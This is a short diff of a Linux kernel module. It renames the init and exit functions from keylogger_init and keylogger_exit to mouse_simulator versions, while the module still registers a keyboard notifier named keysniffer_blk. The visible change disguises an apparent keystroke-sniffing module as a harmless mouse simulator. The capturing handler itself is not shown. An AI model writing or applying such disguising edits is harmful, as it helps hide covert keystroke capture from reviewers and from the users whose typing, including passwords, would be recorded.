@@ -62,7 +62,7 @@ static struct notifier_block keysniffer_blk = {
     .notifier_call = keyboard_event_handler,
 };
  
-static int __init keylogger_init(void)
+static int __init mouse_simulator_init(void)
 {
     printk(KERN_INFO "mouse_simulator: initializing...");
     mouse_simulator_input_dev = input_allocate_device();
@@ -89,12 +89,12 @@ static int __init keylogger_init(void)
     return 0;
 }
  
-static void __exit keylogger_exit(void)
+static void __exit mouse_simulator_exit(void)
 {
     unregister_keyboard_notifier(&keysniffer_blk);
     input_unregister_device(mouse_simulator_input_dev);
     printk(KERN_INFO "mouse_simulator: unloaded.");
 }
  
-module_init(keylogger_init);
-module_exit(keylogger_exit);
+module_init(mouse_simulator_init);
+module_exit(mouse_simulator_exit);
